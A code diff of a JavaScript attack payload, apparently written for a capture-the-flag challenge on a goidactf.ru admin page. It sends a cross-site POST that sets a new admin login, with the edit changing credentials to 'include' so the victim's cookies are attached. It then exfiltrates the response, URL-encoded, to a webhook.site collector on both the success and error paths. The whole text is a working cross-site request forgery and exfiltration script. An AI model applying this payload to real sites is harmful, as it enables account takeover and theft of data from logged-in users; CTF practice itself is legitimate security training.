@@ -10,8 +10,8 @@
   "referrer": "https://tasks.goidactf.ru:20061/admin",
   "body": "new_admin_login=123",
   "method": "POST",
+  credentials: 'include',
   "mode": "cors",
-  "credentials": "omit"
 })
   .then(res => {
     // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!s
@@ -22,15 +22,17 @@
     }));
   })
   .then(data => {
-    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+JSON.stringify(data), {
+    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+encodeURIComponent(JSON.stringify(data)), {
       method: 'GET',
+      credentials: 'include',
       headers: { 'Content-Type': 'application/json' }
     });
   })
   .catch(data => {
   
-    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+JSON.stringify(data), {
+    fetch('https://webhook.site/921ed5f4-97f3-4a0e-a0ae-05295d30d97e?data='+ encodeURIComponent(JSON.stringify(data)), {
       method: 'GET',
+credentials: 'include',
       headers: { 'Content-Type': 'application/json' }
     });
   })
